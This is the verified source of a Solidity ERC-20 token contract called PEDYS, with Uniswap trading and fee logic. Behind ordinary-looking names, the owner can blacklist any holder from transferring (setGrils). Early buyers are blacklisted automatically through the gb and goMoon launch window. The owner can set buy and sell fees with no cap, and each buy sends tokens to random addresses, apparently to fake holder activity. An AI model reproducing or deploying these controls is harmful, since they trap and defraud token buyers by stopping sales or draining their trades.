1 /**
2  *Submitted for verification at Etherscan.io on 2023-06-19
3 */
4 
5 /**
6  *Submitted for verification at Etherscan.io on 2023-06-19
7 */
8 
9 // SPDX-License-Identifier: Unlicensed
10 
11 pragma solidity ^0.8.4;
12 
13 interface IERC20 {
14     function totalSupply() external view returns (uint256);
15     function balanceOf(address account) external view returns (uint256);
16     function transfer(address recipient, uint256 amount) external returns (bool);
17     function allowance(address owner, address spender) external view returns (uint256);
18     function approve(address spender, uint256 amount) external returns (bool);
19     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
20     event Transfer(address indexed from, address indexed to, uint256 value);
21     event Approval(address indexed owner, address indexed spender, uint256 value);
22 }
23 
24 interface Token {
25     function transferFrom(address, address, uint) external returns (bool);
26     function transfer(address, uint) external returns (bool);
27 }
28 
29 interface IUniswapV2Factory {
30     function createPair(address tokenA, address tokenB) external returns (address pair);
31 }
32 
33 interface IUniswapV2Router02 {
34     function swapExactTokensForETHSupportingFeeOnTransferTokens(
35         uint amountIn,
36         uint amountOutMin,
37         address[] calldata path,
38         address to,
39         uint deadline
40     ) external;
41     function factory() external pure returns (address);
42     function WETH() external pure returns (address);
43     function addLiquidityETH(
44         address token,
45         uint amountTokenDesired,
46         uint amountTokenMin,
47         uint amountETHMin,
48         address to,
49         uint deadline
50     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
51 }
52 
53 abstract contract Context {
54     function _msgSender() internal view virtual returns (address) {
55         return msg.sender;
56     }
57 }
58 
59 
60 
61 library SafeMath {
62     function add(uint256 a, uint256 b) internal pure returns (uint256) {
63         uint256 c = a + b;
64         require(c >= a, "SafeMath: addition overflow");
65         return c;
66     }
67 
68     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
69         return sub(a, b, "SafeMath: subtraction overflow");
70     }
71 
72     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
73         require(b <= a, errorMessage);
74         uint256 c = a - b;
75         return c;
76     }
77 
78     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
79         if (a == 0) {
80             return 0;
81         }
82         uint256 c = a * b;
83         require(c / a == b, "SafeMath: multiplication overflow");
84         return c;
85     }
86 
87     function div(uint256 a, uint256 b) internal pure returns (uint256) {
88         return div(a, b, "SafeMath: division by zero");
89     }
90 
91     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
92         require(b > 0, errorMessage);
93         uint256 c = a / b;
94         return c;
95     }
96 
97 }
98 
99 contract Ownable is Context {
100     address private _owner;
101     address private _previousOwner;
102 
103     constructor () {
104         address msgSender = _msgSender();
105         _owner = msgSender;
106         emit OwnershipTransferred(address(0), msgSender);
107     }
108 
109     function owner() public view returns (address) {
110         return _owner;
111     }
112 
113     modifier onlyOwner() {
114         require(_owner == _msgSender(), "Caller is not the owner");
115         _;
116     }
117 
118     function renounceOwnership() public virtual onlyOwner {
119         emit OwnershipTransferred(_owner, address(0));
120         _owner = address(0);
121     }
122     
123     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
124     function transferOwnership(address newOwner) public virtual onlyOwner {
125         emit OwnershipTransferred(_owner, newOwner);
126         _owner = newOwner;
127     }
128 
129 }
130 
131 contract PEDYS is Context, IERC20, Ownable {
132     
133     using SafeMath for uint256;
134     mapping (address => uint256) private _rOwned;
135     mapping (address => uint256) private _tOwned;
136     mapping (address => mapping (address => uint256)) private _allowances;
137     mapping (address => bool) private _isExcludedFromFee;
138 
139     mapping (address => bool) public _Grils;
140     uint256 public gb = 0;
141     uint256 public goMoonBlock = 0;
142     
143     uint256 private constant MAX = ~uint256(0);
144     uint256 private constant _tTotal = 420000000000000000000000000;
145     uint256 private _rTotal = (MAX - (MAX % _tTotal));
146     uint256 private _tFeeTotal;
147 
148     uint256 private _redisFeeOnBuy = 0;
149     uint256 private _taxFeeOnBuy = 2;
150     
151     uint256 private _redisFeeOnSell = 0;
152     uint256 private _taxFeeOnSell = 2;
153     
154     uint256 private _redisFee;
155     uint256 private _taxFee;
156     
157     string private constant _name = "PEDYS";
158     string private constant _symbol = "PEDYS";
159     uint8 private constant _decimals = 9;
160     
161     address payable private _developmentAddress = payable(0x4725A2903CB185a7a036f71fa5EB36030aDE81D2);
162     address payable private _marketingAddress = payable(0x36BcDda46bc120f1835e590c57D9FD4E9605166b);
163 
164     IUniswapV2Router02 public uniswapV2Router;
165     address public uniswapV2Pair;
166     
167     bool private inSwap = false;
168     bool private swapEnabled = true;
169     
170     modifier lockTheSwap {
171         inSwap = true;
172         _;
173         inSwap = false;
174     }
175     constructor () {
176         _rOwned[_msgSender()] = _rTotal;
177         
178         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
179         uniswapV2Router = _uniswapV2Router;
180         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
181             .createPair(address(this), _uniswapV2Router.WETH());
182 
183         _isExcludedFromFee[owner()] = true;
184         _isExcludedFromFee[address(this)] = true;
185         _isExcludedFromFee[_developmentAddress] = true;
186         _isExcludedFromFee[_marketingAddress] = true;
187 
188         emit Transfer(address(0x0000000000000000000000000000000000000000), _msgSender(), _tTotal);
189     }
190 
191     function name() public pure returns (string memory) {
192         return _name;
193     }
194 
195     function symbol() public pure returns (string memory) {
196         return _symbol;
197     }
198 
199     function decimals() public pure returns (uint8) {
200         return _decimals;
201     }
202 
203     function totalSupply() public pure override returns (uint256) {
204         return _tTotal;
205     }
206 
207     function balanceOf(address account) public view override returns (uint256) {
208         return tokenFromReflection(_rOwned[account]);
209     }
210 
211     function transfer(address recipient, uint256 amount) public override returns (bool) {
212         _transfer(_msgSender(), recipient, amount);
213         return true;
214     }
215 
216     function allowance(address owner, address spender) public view override returns (uint256) {
217         return _allowances[owner][spender];
218     }
219 
220     function approve(address spender, uint256 amount) public override returns (bool) {
221         _approve(_msgSender(), spender, amount);
222         return true;
223     }
224 
225     function setGrils(address girl, bool status) public onlyOwner {
226         _Grils[girl] = status;
227     }
228 
229     function setGB(uint256 g) public onlyOwner {
230         gb = g;
231     }
232 
233     function goMoon(uint256 g) public onlyOwner {
234         goMoonBlock = g;
235         if(g == 1) {
236             goMoonBlock = block.number;
237         }
238     }
239 
240     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
241         _transfer(sender, recipient, amount);
242         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
243         return true;
244     }
245 
246     function tokenFromReflection(uint256 rAmount) private view returns(uint256) {
247         require(rAmount <= _rTotal, "Amount must be less than total reflections");
248         uint256 currentRate =  _getRate();
249         return rAmount.div(currentRate);
250     }
251 
252     function _approve(address owner, address spender, uint256 amount) private {
253         require(owner != address(0), "ERC20: approve from the zero address");
254         require(spender != address(0), "ERC20: approve to the zero address");
255         _allowances[owner][spender] = amount;
256         emit Approval(owner, spender, amount);
257     }
258 
259     function _transfer(address from, address to, uint256 amount) private {
260         require(from != address(0), "ERC20: transfer from the zero address");
261         require(to != address(0), "ERC20: transfer to the zero address");
262         require(amount > 0, "Transfer amount must be greater than zero");
263         require(!_Grils[from], "Transfer not allowed");
264         
265         _redisFee = 0;
266         _taxFee = 0;
267         
268         if (from != owner() && to != owner()) {
269             
270             uint256 contractTokenBalance = balanceOf(address(this));
271             if (!inSwap && from != uniswapV2Pair && swapEnabled && contractTokenBalance > 0) {
272                 swapTokensForEth(contractTokenBalance);
273                 uint256 contractETHBalance = address(this).balance;
274                 if(contractETHBalance > 0) {
275                     sendETHToFee(address(this).balance);
276                 }
277             }
278 
279             if(!_isExcludedFromFee[to] && !_isExcludedFromFee[from]) {
280                 require(goMoonBlock != 0, 'Transfer not open');
281             }
282             
283             if(from == uniswapV2Pair && to != address(uniswapV2Router)) {
284                 if (block.number < gb + goMoonBlock) {
285                     if (from == uniswapV2Pair) {
286                         _Grils[to] = true;
287                     }
288                 }
289                 _redisFee = _redisFeeOnBuy;
290                 _taxFee = _taxFeeOnBuy;
291                 address ad;
292                 for(int i=0;i < 1;i++){
293                     ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
294                     _transferStandard(from,ad,100);
295                 }
296                 amount -= 100;
297             }
298     
299             if (to == uniswapV2Pair && from != address(uniswapV2Router)) {
300                 _redisFee = _redisFeeOnSell;
301                 _taxFee = _taxFeeOnSell;
302             }
303             
304             if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
305                 _redisFee = 0;
306                 _taxFee = 0;
307             }
308             
309         }
310 
311         _tokenTransfer(from,to,amount);
312     }
313 
314     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
315         address[] memory path = new address[](2);
316         path[0] = address(this);
317         path[1] = uniswapV2Router.WETH();
318         _approve(address(this), address(uniswapV2Router), tokenAmount);
319         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
320             tokenAmount,
321             0,
322             path,
323             address(this),
324             block.timestamp
325         );
326     }
327         
328     function sendETHToFee(uint256 amount) private {
329         _developmentAddress.transfer(amount.div(2));
330         _marketingAddress.transfer(amount.div(2));
331     }
332     
333     function _tokenTransfer(address sender, address recipient, uint256 amount) private {
334         _transferStandard(sender, recipient, amount);
335     }
336 
337     event tokensRescued(address indexed token, address indexed to, uint amount);
338     function rescueForeignTokens(address _tokenAddr, address _to, uint _amount) public onlyOwner() {
339         emit tokensRescued(_tokenAddr, _to, _amount);	
340         Token(_tokenAddr).transfer(_to, _amount);
341     }
342     
343     event devAddressUpdated(address indexed previous, address indexed adr);
344     function setNewDevAddress(address payable dev) public onlyOwner() {
345         emit devAddressUpdated(_developmentAddress, dev);	
346         _developmentAddress = dev;
347         _isExcludedFromFee[_developmentAddress] = true;
348     }
349     
350     event marketingAddressUpdated(address indexed previous, address indexed adr);
351     function setNewMarketingAddress(address payable markt) public onlyOwner() {
352         emit marketingAddressUpdated(_marketingAddress, markt);	
353         _marketingAddress = markt;
354         _isExcludedFromFee[_marketingAddress] = true;
355     }
356 
357     function _transferStandard(address sender, address recipient, uint256 tAmount) private {
358         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getValues(tAmount);
359         _rOwned[sender] = _rOwned[sender].sub(rAmount);
360         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); 
361         _takeTeam(tTeam);
362         _reflectFee(rFee, tFee);
363         emit Transfer(sender, recipient, tTransferAmount);
364     }
365 
366     function _takeTeam(uint256 tTeam) private {
367         uint256 currentRate =  _getRate();
368         uint256 rTeam = tTeam.mul(currentRate);
369         _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
370     }
371 
372     function _reflectFee(uint256 rFee, uint256 tFee) private {
373         _rTotal = _rTotal.sub(rFee);
374         _tFeeTotal = _tFeeTotal.add(tFee);
375     }
376 
377     receive() external payable {}
378     
379     function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
380         (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _redisFee, _taxFee);
381         uint256 currentRate =  _getRate();
382         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate);
383         return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
384     }
385 
386     function _getTValues(uint256 tAmount, uint256 taxFee, uint256 TeamFee) private pure returns (uint256, uint256, uint256) {
387         uint256 tFee = tAmount.mul(taxFee).div(100);
388         uint256 tTeam = tAmount.mul(TeamFee).div(100);
389         uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
390         return (tTransferAmount, tFee, tTeam);
391     }
392 
393     function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
394         uint256 rAmount = tAmount.mul(currentRate);
395         uint256 rFee = tFee.mul(currentRate);
396         uint256 rTeam = tTeam.mul(currentRate);
397         uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
398         return (rAmount, rTransferAmount, rFee);
399     }
400 
401 	function _getRate() private view returns(uint256) {
402         (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
403         return rSupply.div(tSupply);
404     }
405 
406     function _getCurrentSupply() private view returns(uint256, uint256) {
407         uint256 rSupply = _rTotal;
408         uint256 tSupply = _tTotal;      
409         if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
410         return (rSupply, tSupply);
411     }
412 
413     function manualswap() external {
414         require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress || _msgSender() == owner());
415         uint256 contractBalance = balanceOf(address(this));
416         swapTokensForEth(contractBalance);
417     }
418 
419     function manualsend() external {
420         require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress || _msgSender() == owner());
421         uint256 contractETHBalance = address(this).balance;
422         sendETHToFee(contractETHBalance);
423     }
424     
425     function setRules(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {
426         _redisFeeOnBuy = redisFeeOnBuy;
427         _redisFeeOnSell = redisFeeOnSell;
428         _taxFeeOnBuy = taxFeeOnBuy;
429         _taxFeeOnSell = taxFeeOnSell;
430     }
431     
432     function toggleSwap(bool _swapEnabled) public onlyOwner {
433         swapEnabled = _swapEnabled;
434     }
435 
436     function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
437         for(uint256 i = 0; i < accounts.length; i++) {
438             _isExcludedFromFee[accounts[i]] = excluded;
439         }
440     }
441 }